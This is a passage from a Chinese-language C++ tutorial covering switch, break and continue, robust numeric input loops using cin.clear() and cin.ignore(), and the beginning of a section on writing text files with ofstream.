(等效)</span></span><br><span class="line"><span class="keyword">switch</span> (num) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;One&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Two&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 执行</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Three&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Other&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于这种基于单个整数值的多路分支，<code>switch</code> 通常被认为更清晰、有时效率也可能更高（编译器可能将其优化为跳转表）。但对于涉及范围或非整数类型的判断，则必须使用 <code>if else if</code> 结构。</p><h2 id="6-6-break-和-continue-语句"><a href="#6-6-break-和-continue-语句" class="headerlink" title="6.6 break 和 continue 语句"></a>6.6 break 和 continue 语句</h2><p>C++ 提供了两个特殊的语句，<code>break</code> 和 <code>continue</code>，用于在循环（<code>for</code>, <code>while</code>, <code>do while</code>）或 <code>switch</code> 语句内部改变正常的执行流程。</p><h3 id="6-6-1-break-语句"><a href="#6-6-1-break-语句" class="headerlink" title="6.6.1 break 语句"></a>6.6.1 break 语句</h3><p><code>break</code> 语句用于立即终止<strong>包含它</strong>的最内层的循环（<code>for</code>, <code>while</code>, <code>do while</code>）或 <code>switch</code> 语句的执行。程序控制流会跳转到该循环或 <code>switch</code> 语句之后的下一条语句。</p><p><strong>用法:</strong></p><ul><li>  <strong>在循环中:</strong> 当满足某个特定条件时，提前退出循环。</li><li>  <strong>在 <code>switch</code> 语句中:</strong> 防止“贯穿”（fall-through）到下一个 <code>case</code>，在执行完匹配的 <code>case</code> 代码块后跳出 <code>switch</code> 结构（如 6.5 节所述）。</li></ul><p><strong>示例 (在循环中使用):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 查找数组中第一个负数的位置</span></span><br><span class="line">    <span class="keyword">int</span> numbers[] = &#123;<span class="number">10</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">-2</span>, <span class="number">8</span>, <span class="number">-5</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> found_index = <span class="number">-1</span>; <span class="comment">// 初始化为 -1，表示未找到</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Searching for the first negative number...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Checking index &quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;, value: &quot;</span> &lt;&lt; numbers[i] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">if</span> (numbers[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            found_index = i;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Negative number found at index &quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;. Breaking loop.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">// 找到第一个负数，立即跳出 for 循环</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (found_index != <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The loop was terminated early.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;No negative number found in the array.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 演示在嵌套循环中的作用</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nNested loop example:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">3</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= <span class="number">3</span>; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">2</span> &amp;&amp; j == <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Breaking inner loop at i=&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;, j=&quot;</span> &lt;&lt; j &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">                <span class="keyword">break</span>; <span class="comment">// 只跳出内层循环 (j 循环)</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;i=&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;, j=&quot;</span> &lt;&lt; j &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// break 后，控制流会到达这里，继续外层循环的下一次迭代</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;End of inner loop for i=&quot;</span> &lt;&lt; i &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>代码解释:</strong></p><ol><li> 第一个循环遍历 <code>numbers</code> 数组。当 <code>i</code> 为 3 时，<code>numbers[3]</code> 是 -2，满足 <code>if</code> 条件。<code>found_index</code> 被设为 3，打印消息，然后 <code>break</code> 语句被执行，立即终止 <code>for</code> 循环。后面的元素（8 和 -5）不会被检查。</li><li> 在嵌套循环示例中，当 <code>i</code> 为 2 且 <code>j</code> 为 2 时，<code>break</code> 语句执行。它只终止了最内层的 <code>j</code> 循环。外层的 <code>i</code> 循环继续执行其下一次迭代（当 <code>i</code> 为 3 时）。</li></ol><h3 id="6-6-2-continue-语句"><a href="#6-6-2-continue-语句" class="headerlink" title="6.6.2 continue 语句"></a>6.6.2 continue 语句</h3><p><code>continue</code> 语句用于跳过当前循环迭代中<strong>剩余</strong>的代码，并立即开始下一次迭代。与 <code>break</code> 不同，<code>continue</code> 不会终止整个循环。</p><p><strong>用法:</strong></p><ul><li>  <strong>在 <code>while</code> 和 <code>do while</code> 循环中:</strong> 控制流跳转到循环条件的判断处。</li><li>  <strong>在 <code>for</code> 循环中:</strong> 控制流首先跳转到 <code>for</code> 循环的更新表达式（例如 <code>++i</code>），然后跳转到循环条件的判断处。</li></ul><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 打印 1 到 10 之间的奇数</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Odd numbers between 1 and 10:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>) &#123; <span class="comment">// 如果 i 是偶数</span></span><br><span class="line">            <span class="keyword">continue</span>;     <span class="comment">// 跳过本次迭代剩余的部分 (cout 语句)，直接进行下一次迭代 (i++)</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 只有当 i 是奇数时，才会执行这行代码</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; i &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: 1 3 5 7 9</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 演示在 while 循环中</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nSkipping number 5 in while loop (1 to 7):&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">int</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; <span class="number">7</span>) &#123;</span><br><span class="line">        k++; <span class="comment">// 先递增 k</span></span><br><span class="line">        <span class="keyword">if</span> (k == <span class="number">5</span>) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;(Skipping 5) &quot;</span>;</span><br><span class="line">            <span class="keyword">continue</span>; <span class="comment">// 跳过本次迭代的 cout</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; k &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: 1 2 3 4 (Skipping 5) 6 7</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>代码解释:</strong></p><ol><li> 在 <code>for</code> 循环中，当 <code>i</code> 是偶数时（<code>i % 2 == 0</code> 为真），<code>continue</code> 语句执行。它跳过了 <code>std::cout &lt;&lt; i &lt;&lt; &quot; &quot;;</code> 这行代码，直接执行更新表达式 <code>++i</code>，然后判断循环条件 <code>i &lt;= 10</code>。因此，只有奇数被打印出来。</li><li> 在 <code>while</code> 循环中，当 <code>k</code> 递增到 5 时，<code>if</code> 条件满足，<code>continue</code> 执行，跳过了 <code>std::cout &lt;&lt; k &lt;&lt; &quot; &quot;;</code>，直接回到 <code>while (k &lt; 7)</code> 的条件判断。</li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>  <code>break</code>: 完全<strong>终止</strong>最内层的循环或 <code>switch</code>。</li><li>  <code>continue</code>: <strong>跳过</strong>当前循环迭代的剩余部分，进入<strong>下一次迭代</strong>（如果循环条件允许）。</li></ul><p>这两个语句可以使循环控制更加灵活，但过度使用可能会降低代码的可读性。通常，可以通过调整循环条件或使用 <code>if</code> 语句来避免一些不必要的 <code>break</code> 或 <code>continue</code>。</p><h2 id="6-7-读取数字的循环"><a href="#6-7-读取数字的循环" class="headerlink" title="6.7 读取数字的循环"></a>6.7 读取数字的循环</h2><p>在 C++ 程序中，经常需要编写循环来读取用户的数字输入，直到满足某个条件（例如输入特定值或遇到无效输入）为止。然而，处理数字输入，特别是处理潜在的错误输入，需要一些技巧。</p><h3 id="基本的数字读取循环"><a href="#基本的数字读取循环" class="headerlink" title="基本的数字读取循环"></a>基本的数字读取循环</h3><p>一个简单的读取数字并累加的循环可能如下所示：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> input_number;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter numbers to sum (enter a non-number to quit): &quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 尝试读取一个整数，如果成功，cin 返回 true</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; input_number) &#123;</span><br><span class="line">        sum += input_number;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Current sum: &quot;</span> &lt;&lt; sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter next number: &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当输入非数字时，循环结束</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nLoop terminated.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Final sum: &quot;</span> &lt;&lt; sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>工作方式:</strong></p><ol><li> <code>std::cin &gt;&gt; input_number</code> 尝试从输入流中读取一个整数并存储到 <code>input_number</code> 中。</li><li> 这个表达式本身会返回 <code>std::cin</code> 对象。在需要布尔值的上下文中（如 <code>while</code> 的条件），<code>std::cin</code> 对象会根据流的状态转换为 <code>true</code> 或 <code>false</code>。</li><li> 如果成功读取一个整数，流状态是正常的，<code>std::cin</code> 转换为 <code>true</code>，循环体执行。</li><li> 如果用户输入了非数字（例如输入 “hello” 或按 Ctrl+Z/Ctrl+D 表示文件结束），<code>std::cin &gt;&gt; input_number</code> 会失败。此时，<code>std::cin</code> 会进入“失败”（fail）状态，转换为 <code>false</code>，循环终止。</li></ol><h3 id="处理错误输入"><a href="#处理错误输入" class="headerlink" title="处理错误输入"></a>处理错误输入</h3><p>上面的简单循环在遇到非数字输入时会终止，但它没有明确地处理错误状态。如果循环结束后还需要继续从 <code>std::cin</code> 读取其他类型的输入，就需要清除错误状态并丢弃无效的输入。</p><p><strong>问题:</strong> 当 <code>std::cin &gt;&gt; input_number</code> 失败时，输入流 <code>std::cin</code> 会设置一个错误标志（failbit），并且导致失败的输入（例如 “hello”）仍然留在输入缓冲区中。如果不处理，后续的 <code>std::cin</code> 操作通常也会立即失败。</p><p><strong>解决方案:</strong></p><ol><li> <strong>清除错误状态:</strong> 使用 <code>std::cin.clear()</code> 方法重置流的错误标志。</li><li> <strong>忽略无效输入:</strong> 使用 <code>std::cin.ignore()</code> 方法丢弃输入缓冲区中不需要的字符。通常会忽略直到下一个换行符 <code>\n</code> 或达到某个最大字符数。</li></ol><p><strong>示例 (更健壮的数字读取循环):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits&gt; // 需要包含 &lt;limits&gt; 来使用 numeric_limits</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> input_number;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter numbers to sum (enter a non-number to quit): &quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123; <span class="comment">// 使用无限循环，内部处理退出条件</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter a number: &quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; input_number) &#123;</span><br><span class="line">            <span class="comment">// 成功读取数字</span></span><br><span class="line">            sum += input_number;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Current sum: &quot;</span> &lt;&lt; sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 读取失败 (输入了非数字或 EOF)</span></span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Invalid input detected or EOF reached.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 检查是否是文件结束符 (EOF)</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">std</span>::<span class="built_in">cin</span>.eof()) &#123;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;End of file reached. Exiting.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">                <span class="keyword">break</span>; <span class="comment">// 如果是 EOF，直接退出循环</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 清除错误标志，使 cin 恢复正常</span></span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Clearing error state...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cin</span>.clear();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 丢弃缓冲区中导致错误的无效输入，直到换行符</span></span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Discarding invalid input...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cin</span>.ignore(<span class="built_in">std</span>::numeric_limits&lt;<span class="built_in">std</span>::streamsize&gt;::max(), <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Please try entering a number again, or press Ctrl+Z/Ctrl+D to exit.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="comment">// 注意：在这个版本中，遇到非数字输入后，我们提示用户重试或退出，</span></span><br><span class="line">            <span class="comment">// 而不是像第一个例子那样直接终止求和。</span></span><br><span class="line">            <span class="comment">// 如果希望遇到非数字就退出，可以在 else 块的末尾加上 break;</span></span><br><span class="line">            <span class="comment">// break; // 取消注释此行，则遇到非数字输入时退出循环</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nLoop finished.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Final sum: &quot;</span> &lt;&lt; sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 可以在这里尝试读取其他输入，因为错误状态已被清除</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> remaining_input;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nEnter some text: &quot;</span>;</span><br><span class="line">    <span class="comment">// 需要先忽略掉上次输入留下的换行符（如果存在）</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">std</span>::<span class="built_in">cin</span>.peek() == <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cin</span>.ignore();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::getline(<span class="built_in">std</span>::<span class="built_in">cin</span>, remaining_input);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You entered: &quot;</span> &lt;&lt; remaining_input &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>代码解释:</strong></p><ol><li> 使用 <code>while(true)</code> 创建一个看似无限的循环，退出逻辑放在循环内部。</li><li> <code>if (std::cin &gt;&gt; input_number)</code> 尝试读取数字。</li><li> 如果成功，执行加法。</li><li>如果失败 (<code>else</code> 块)：<ul><li>  打印错误消息。</li><li>  检查是否是文件结束符 (<code>std::cin.eof()</code>)，如果是则 <code>break</code>。</li><li>  调用 <code>std::cin.clear()</code> 清除 <code>failbit</code> 等错误状态。</li><li>  调用 <code>std::cin.ignore(...)</code> 来丢弃缓冲区中的无效输入。<code>std::numeric_limits&lt;std::streamsize&gt;::max()</code> 表示忽略尽可能多的字符，直到遇到换行符 <code>\n</code>。这确保了下一次循环迭代时，<code>std::cin</code> 不会再次读取相同的无效输入。</li><li>  根据需要，可以选择 <code>break</code> 退出，或者让循环继续，提示用户重新输入。</li></ul></li></ol><p>这种模式在需要从用户那里可靠地读取数字输入时非常有用，因为它能优雅地处理输入错误，而不是让程序因为意外的输入而崩溃或行为异常。</p><h2 id="6-8-简单文件输入-输出"><a href="#6-8-简单文件输入-输出" class="headerlink" title="6.8 简单文件输入/输出"></a>6.8 简单文件输入/输出</h2><p>到目前为止，我们主要使用 <code>cin</code> 从键盘读取输入，用 <code>cout</code> 向屏幕显示输出。C++ 还提供了强大的功能，可以让我们将数据写入文件或从文件中读取数据。这对于存储程序运行结果、读取配置文件或处理大量数据至关重要。本节将介绍基本的文本文件输入/输出（I/O）操作。</p><h3 id="6-8-1-文本-I-O-和文本文件"><a href="#6-8-1-文本-I-O-和文本文件" class="headerlink" title="6.8.1 文本 I/O 和文本文件"></a>6.8.1 文本 I/O 和文本文件</h3><p>文件 I/O 主要有两种模式：文本模式和二进制模式。</p><ul><li><p>  <strong>文本文件 (Text File):</strong> 文本文件存储的是人类可读的字符序列。文件中的数据被解释为字符，数字（如 <code>123</code>）会被存储为字符序列（<code>&#39;1&#39;</code>, <code>&#39;2&#39;</code>, <code>&#39;3&#39;</code>）。在不同的操作系统上，文本文件对行尾的处理可能不同（例如，Windows 使用回车+换行 <code>\r\n</code>，Unix/Linux 使用换行 <code>\n</code>）。C++ 的文本 I/O 会自动处理这些行尾转换，使得代码更具可移植性。我们通常使用 <code>&lt;&lt;</code> 和 <code>&gt;&gt;</code> 或 <code>getline</code> 等函数来处理文本文件。</p></li><li><p>  <strong>二进制文件 (Binary File):</strong> 二进制文件存储的是数据的原始字节表示。数字 <code>123</code> 会被存储为其在内存中的二进制形式（例如，一个 4 字节的 <code>int</code>）。二进制 I/O 不进行任何字符转换或行尾处理，读写速度通常更快，文件也可能更小，但内容通常不是人类直接可读的。处理二进制文件通常使用 <code>read()</code> 和 <code>write()</code> 成员函数。</p></li></ul><p>本节重点介绍<strong>文本文件</strong>的 I/O 操作。</p><h3 id="6-8-2-写入到文本文件中"><a href="#6-8-2-写入到文本文件中" class="headerlink" title="6.8.2 写入到文本文件中"></a>6.8.2 写入到文本文件中</h3><p>要将数据写入文本文件，我们需要使用 C++ 的文件流库 <code>&lt;fstream&gt;</code>。</p><p><strong>步骤:</strong></p><ol><li> <strong>包含头文件:</strong> <code>#include &lt;fstream&gt;</code></li><li><strong>创建 <code>ofstream</code> 对象:</strong> <code>ofstream</code> 类（output file stream）用于向文件写入数据。你需要创建一个该类的对象，并在创建时或之后将其与一个文件名关联起来。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::ofstream outputFile; <span class="comment">// 创建 ofstream 对象</span></span><br><span class="line">outputFile.open(<span class="string">&quot;mydata.txt&quot;</span>); <span class="comment">// 将对象与文件关联（如果文件不存在则创建，如果存在则清空内容）</span></span><br><span class="line"><span class="comment">// 或者在创建时直接关联</span></span><br><span class="line"><span class="comment">// std::ofstream outputFile(&quot;mydata.txt&quot;);</span></span><br></pre></td></tr></table></figure></li><li><strong>检查文件是否成功打开:</strong> 在尝试写入之前，最好检查文件是否成功打开。可以使用 <code>is_open()</code> 